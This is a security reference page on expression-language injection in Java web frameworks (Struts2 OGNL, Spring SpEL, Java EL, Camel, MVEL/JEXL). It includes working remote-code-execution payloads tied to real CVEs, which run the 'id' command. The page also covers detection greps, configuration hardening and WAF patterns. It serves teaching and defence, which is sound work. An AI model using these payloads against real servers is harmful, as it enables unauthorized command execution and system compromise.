---
title: Expression injection (EL / SpEL / OGNL)
slug: expression-injection
---

> **TL;DR:** Server-side mini-languages — Java EL, Spring SpEL, Apache OGNL, MVEL — interpret strings as code. When an HTTP parameter ends up parsed as an expression, the result is RCE in the JVM, even with no deserialization gadgets present.

## What it is
Java frameworks ship expression engines for dynamic property access, view rendering, validation, and routing. Each engine exposes a parser that takes a string and evaluates it against a context root. If that string is attacker-controlled — directly or via a property reference such as `${param.x}` — the attacker runs arbitrary Java.

## Preconditions / where it applies
- JVM web app with one of: Spring (SpEL), Struts2 (OGNL), JSF/JSP (EL), Camel (Simple/JsonPath), MVEL, JEXL
- A sink that calls the parser on a string influenced by request data
- No effective expression sandbox — most engines disable the SecurityManager-style sandbox by default

## Technique

**Apache Struts2 — OGNL (CVE-2017-5638, CVE-2018-11776, CVE-2023-50164):** Struts pushes form parameters through OGNL on the ValueStack. A header or parameter rendered as an expression executes:
```
Content-Type: %{(#_='multipart/form-data')
.(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)
.(#_memberAccess?(#_memberAccess=#dm):(...))
.(#cmd='id').(#p=new java.lang.ProcessBuilder({'sh','-c',#cmd}))
.(#p.redirectErrorStream(true)).(#proc=#p.start())
.(@org.apache.commons.io.IOUtils@toString(#proc.getInputStream()))}
```

**Spring SpEL (CVE-2022-22963 — Spring Cloud Function, CVE-2022-22965 / Spring4Shell adjacent):** any controller calling `parser.parseExpression(userInput).getValue()` or routes that resolve `#{...}` from request data:
```
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")
```
SpEL `T(...)` lookups load arbitrary classes. `new ProcessBuilder(...).start()` also works.

**Java EL (CVE-2017-1000486, CVE-2018-9206 etc.):** Bean Validation `@Pattern(message="${...}")` evaluates EL on the violation message. If `Validator.validate` runs on an entity with attacker-set fields and the constraint message includes user data:
```
${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

**Camel Simple language:** `${exec:...}` and `${bean:...}` execute when a route option is user-controlled.

**MVEL/JEXL:** any `MVEL.eval(input)` / `new JexlEngine().createScript(input).execute(ctx)` is direct RCE.

## Detection and defence
- Grep for `parseExpression`, `Ognl.getValue`, `Ognl.parseExpression`, `ELProcessor.eval`, `MVEL.eval`, `JexlEngine.createScript`, `@Pattern(message=` with concat
- Spring: never parse user input as SpEL. If unavoidable, use `SimpleEvaluationContext.forReadOnlyDataBinding()` instead of `StandardEvaluationContext`
- Struts: keep on a supported branch (≥ 6.x), enable Strict OGNL allowlist, drop `multipart/form-data` upload component if unused
- Bean Validation: set `hibernate.validator.constraint-expression-language-feature-level=NONE` (HV 6.2+) — disables EL in messages
- WAF rules on `%{`, `${T(`, `${''.getClass`, `Runtime.getRuntime` in headers and params catch the noisy payloads

## References
- [PortSwigger — Server-side template injection](https://portswigger.net/web-security/server-side-template-injection) — overlapping methodology
- [HackTricks — OGNL injection](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/ssti-server-side-template-injection/el-expression-language.html) — payload corpus
- [Spring SpEL docs](https://docs.spring.io/spring-framework/reference/core/expressions.html) — official EvaluationContext options
- [Apache Struts S2-066 advisory](https://cwiki.apache.org/confluence/display/WW/S2-066) — modern OGNL chain
